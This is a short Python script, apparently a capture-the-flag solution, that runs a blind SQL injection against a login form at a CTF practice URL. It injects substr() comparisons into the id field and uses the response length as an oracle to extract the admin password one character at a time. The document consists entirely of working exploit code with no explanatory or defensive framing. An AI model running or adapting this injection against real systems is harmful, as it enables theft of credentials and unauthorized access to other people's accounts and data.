import requests


def main():
    url = "https://ctfq.u1tramarine.blue/q6/"

    # 何文字目か
    str_num = 1
    # 判定文字
    str_judge = chr(ord("a")-1)
    str_len = 0
    word_exp = "pass:"

    while(str_num <= 21):
        while(str_len < 1000):
            if str_judge == "z":
                str_judge = "A"
            elif str_judge == "Z":
                str_judge = "0"
            elif str_judge == "9":
                str_judge = "_"
            else :
                str_judge = chr(ord(str_judge) + 1)
            data = {
                "id":f"' or substr((SELECT pass FROM user WHERE id = 'admin'),{str_num}, 1) = '{str_judge}' --",
                "pass":""
            }
            response = requests.post(url, data=data)
            str_len = len(response.text)
            print(f"{str_judge} scanned")

        print(f"word{str_num}: {str_judge}")
        word_exp = word_exp + str_judge
        str_num += 1
        str_judge = chr(ord("a")-1)
        data = {
                "id":f"' or substr((SELECT pass FROM user WHERE id = 'admin'),{str_num}, 1) = '{str_judge}' --",
                "pass":""
            }
        response = requests.post(url, data=data)
        str_len = len(response.text)
    
    print(word_exp)

main()